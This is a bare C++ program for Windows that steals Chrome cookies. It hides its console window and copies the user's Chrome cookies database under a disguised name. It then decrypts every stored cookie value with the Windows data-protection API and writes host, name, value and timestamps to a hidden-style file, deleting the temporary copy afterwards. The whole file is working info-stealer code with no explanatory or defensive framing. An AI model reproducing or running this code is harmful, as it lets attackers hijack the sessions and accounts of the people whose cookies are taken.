#include <windows.h>
#include <string>
#include <fstream>
#include "sqlite3.h"
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::string text, nl = "\n", hostkey = "host_key:", name = "name:", value = "value:", created = "created:", expires = "expires:", lastaccessed = "last_accessed:";
	{
		TCHAR username[100];
		DWORD size = 100;
		GetUserName((TCHAR*)username, &size);
		std::ifstream  src("C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\cookies", std::ios::binary);
		std::ofstream  dst("..hc_ckob", std::ios::binary);
		dst << src.rdbuf();
		sqlite3 *db;
		sqlite3_open("..hc_ckob", &db);
		sqlite3_stmt *pStmt;
		sqlite3_prepare(db, "SELECT host_key, name, encrypted_value, creation_utc, expires_utc, last_access_utc FROM cookies", -1, &pStmt, 0);
		int rc = sqlite3_step(pStmt);
		std::string decryptedvalue;
		DATA_BLOB encryptedPass, decryptedPass;
		while (rc == SQLITE_ROW) {
			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
			CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
			decryptedvalue = (char*)decryptedPass.pbData;
			text += nl + hostkey + (char*)sqlite3_column_text(pStmt, 0) + nl + name + (char*)sqlite3_column_text(pStmt, 1) + nl + value + decryptedvalue + nl + created + (char*)sqlite3_column_text(pStmt, 3) + nl + expires + (char*)sqlite3_column_text(pStmt, 4) + nl + lastaccessed + (char*)sqlite3_column_text(pStmt, 5) + nl;
			decryptedvalue.clear();
			rc = sqlite3_step(pStmt);
		}
		sqlite3_finalize(pStmt);
		sqlite3_close(db);
	}
	std::ofstream file("files/..hc_ckxt", std::ios::app);
	file << text;
	file.close();
	remove("..hc_ckob");
}